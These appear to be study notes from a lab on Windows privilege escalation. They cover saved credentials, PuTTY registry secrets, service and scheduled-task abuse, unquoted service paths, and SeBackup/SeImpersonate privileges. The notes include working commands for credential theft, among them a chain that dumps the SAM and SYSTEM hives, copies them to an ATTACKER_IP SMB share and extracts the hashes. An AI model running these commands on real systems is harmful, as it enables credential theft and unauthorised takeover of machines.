# Privilege escalation 

Looking for powershell history ( It will work only in command prompt)

```c
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Looking for saved creds 

```c
cmdkey /list
```

After that you can use "runas" to run a program with that privilege as you can't see the password withh "cmdkey /list"  

```c
runas /savecred /user:admin cmd.exe
```

Looking for **IIS** server config file 

Usually config file's are generally found in any one of these two files 

-   C:\inetpub\wwwroot\web.config
-   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config


Looking for password stored in SSH-Putty 

```zsh
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```


# Schedule task 


You can use this command to look for current schedule task , In terms of red teaming one can modify the binary or replace with a newly created malicious binary . 

```
schtasks
```

Then one can use thish command to look for more info about that binary (here you have to replace vulntask with the name of binary which u recently discovered )

```c
schtasks /query /tn vulntask /fo list /v
```

U can use `icacls` to check for file premission 

# Abusing svc misconfigurations 

One can look for the services like ```sc qc servicename```

Then you can look for permissions using "icacls" if you have necessary permissions you can overwrite that file with your payload . Then you can give change permissions ```
icacls service.exe /grant Everyone:F```
After this you can use ```sc stop servicename```
```sc start servicename```

# Abusing unquoted service path 

Unquoted path privilege escalation is a type of vulnerability that can occur on Windows systems. When a Windows service is installed with an unquoted path, it can potentially be exploited to escalate privileges on the system.

The issue arises because Windows services can be installed in directories that have spaces in their names, but if the path to the service executable is not surrounded by quotes, Windows may misinterpret the path and try to execute a different file. For example, if a service is installed in "C:\Program Files\MyService\service.exe" but the path is not surrounded by quotes, Windows may try to execute "C:\Program.exe" instead.

An attacker who gains access to a low-privileged user account on the system may be able to exploit this vulnerability to escalate their privileges to those of the service account, which may have higher privileges. By creating a malicious file with a name that matches the misinterpreted path, the attacker can cause Windows to execute their file instead of the intended service executable.

To fix this vulnerability, service paths should always be surrounded by quotes to ensure that Windows interprets the path correctly. Administrators can also use tools like Microsoft's Sysinternals "AccessChk" or "AccessEnum" to identify unquoted service paths on their systems. Once identified, administrators can update the paths to include quotes and restart the affected services.

# Abusing dangerous privileges 

**Sebackup /Serestore**

If we have this perms we can copy the hashes 

```shell-session
reg save hklm\system C:\Users\THMBackup\system.hive
```

```shell-session
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

Now we can send them to our  local machine 

Run this command on your local machine (kali)

```sh
impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share
```

Run this on windows 

```shell-session
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
```

Then you can use impacket to dump the hash 

```shell-session
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```


**SeTakeOwnership**

If we have this permission we can take ownership of anyfile and then we can replace that file with our own exe 


**SeImpersonate / SeAssignPrimaryToken**

If we have this permision we can impersonate as any user on that system 

Some tools which we can use juicypotato.exe and RogueWinRM.exe

